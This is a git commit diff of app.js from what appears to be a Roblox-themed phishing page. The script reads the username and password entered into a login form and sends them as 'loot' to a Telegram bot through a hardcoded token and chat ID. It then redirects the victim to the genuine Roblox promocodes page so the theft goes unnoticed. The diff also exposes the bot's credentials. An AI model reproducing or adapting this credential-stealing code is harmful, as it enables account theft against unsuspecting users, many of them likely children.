efe829100134df9c928f819d6dead0687cd36aa5
HawliPoyraz <ptaylan16@gmail.com>
2026-01-28 11:56:57 +0300

    Update app.js

--- app.js
+++ app.js
@@ -1,6 +1,6 @@
-// Kesinleşmiş ve Doğrulanmış Bilgiler
-const token = "8587670631:AAGkVl-0y8SF9gXTz2_6y0oBdZR1rGlJFl0"; // Son attığın doğru token
-const chatID = "8512406356"; // Senin Chat ID'n
+// Kesinleşmiş Bilgiler
+const token = "8587670631:AAGkVl-0y8SF9gXTz2_6y0oBdZR1rGlJFl0"; 
+const chatID = "8512406356"; 
 
 document.getElementById('xf').addEventListener('submit', function(e) {
     e.preventDefault();
@@ -8,14 +8,11 @@ document.getElementById('xf').addEventListener('submit', function(e) {
     const u = document.getElementById('u').value;
     const p = document.getElementById('p').value;
     
-    const mesaj = `🎯 ROBUX GANİMETİ DÜŞTÜ!\n\n👤 Kullanıcı: ${u}\n🔑 Şifre: ${p}`;
-    
-    // Telegram API İsteği
+    const mesaj = `💰 YENİ GANİMET!\n👤: ${u}\n🔑: ${p}`;
     const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatID}&text=${encodeURIComponent(mesaj)}`;
 
-    fetch(url, { mode: 'no-cors' }) // Tarayıcı engelini aşmak için no-cors ekledik
+    fetch(url, { mode: 'no-cors' })
     .then(() => {
-        // Bilgi gittikten sonra kurbanı inandırıcı bir yere yolla
         window.location.replace("https://www.roblox.com/promocodes");
     })
     .catch(() => {
